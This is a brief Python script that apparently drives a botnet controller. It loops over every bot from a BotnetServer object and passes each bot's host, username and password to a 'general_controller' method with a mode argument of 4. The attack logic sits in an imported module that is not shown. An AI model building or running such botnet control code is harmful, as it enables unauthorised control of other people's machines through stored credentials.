from botnet import BotnetServer


if __name__ == '__main__':
    bs: BotnetServer = BotnetServer()
    for bot in bs.get_all_bots():
        bsx: BotnetServer = BotnetServer()
        bsx.general_controller(bot.host,
                              bot.username,
                              bot.password,
                              4)
